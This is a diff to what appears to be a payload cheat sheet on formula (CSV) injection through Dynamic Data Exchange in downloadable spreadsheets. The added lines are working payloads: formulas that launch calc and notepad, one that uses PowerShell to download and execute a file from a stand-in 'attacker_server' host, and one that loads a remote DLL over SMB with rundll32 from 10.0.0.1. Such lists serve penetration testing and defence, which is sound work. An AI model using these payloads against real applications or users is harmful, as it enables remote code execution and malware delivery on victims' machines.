@@ -7,10 +7,18 @@ Many web applications allow the user to download content such as templates for i
 Basic exploit with Dynamic Data Exchange
 
 ```powershell
+# pop a calc
 DDE ("cmd";"/C calc";"!A0")A0
 @SUM(1+1)*cmd|' /C calc'!A0
+
+# pop a notepad
 =cmd|' /C notepad'!'A1'
+
+# powershell download and execute
 =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+
+# msf smb delivery with rundll32
+=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
 ```
 
 Technical Details of the above payload:
